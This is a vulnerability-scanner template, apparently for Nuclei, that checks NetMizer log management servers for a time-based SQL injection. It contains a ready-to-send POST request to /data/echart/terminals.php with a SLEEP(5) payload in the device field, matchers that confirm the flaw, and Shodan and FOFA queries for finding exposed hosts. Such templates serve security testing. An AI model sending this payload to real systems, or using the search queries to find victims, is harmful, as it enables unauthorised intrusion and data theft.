id: netmizer-phonelist-bar-sqli

info:
  name: NetMizer LogManagement System phonelist-bar - SQL Injection
  author: qwtd
  severity: high
  description: |
    SQL Injection vulnerability in the NetMizer log management system phonelist-bar, and the attacker can execute arbitrary SQL commands by passing in the SQL parameter.
  reference:
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/NetMizer/NetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fterminals%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"NetMizer"
    fofa-query: title="NetMizer 日志管理系统"
  tags: NetMizer-日志管理系统

http:
  - raw: 
      - |
        POST /data/echart/terminals.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
        Accept: */*
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest
        Priority: u=0
        Content-Length: 40

        action=phonelist-bar&type=3&device=1 AND (SELECT 6478 FROM (SELECT(SLEEP(5)))hviO)

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'series'
          - 'xaxis'
          - 'legend'
        condition: and
      - type: dsl
        dsl:
          - 'duration >= 5'

      - type: status
        status:
          - 200
